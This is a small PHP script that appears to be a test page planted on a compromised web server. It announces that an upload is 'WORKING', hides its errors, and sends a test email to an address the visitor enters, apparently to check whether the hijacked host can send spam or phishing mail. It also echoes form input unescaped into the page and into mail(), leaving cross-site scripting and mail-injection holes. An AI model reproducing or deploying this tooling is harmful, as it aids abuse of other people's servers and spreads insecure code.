<?php
error_reporting(0);

?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" name="email" value="<?php print $_POST['email']?>"required >
<input type="text" name="cp" value="<?php print $_POST['cp']?>"required >
	<input type="submit" value="Send test >>">

</form>
<br>
<?php
if (!empty($_POST['email'])){
	$xx = rand();
	 $xxx=$_POST['cp'];
	mail($_POST['email'],"\n\n\n\nResult Report Test : ". $xx ,"Working -\n ". $xxx);
	print "<b>send an repo to xxxxxxx@gmail.com - st1 $xx st2 <br><br><br> $xxx  </b>"; 
}
?>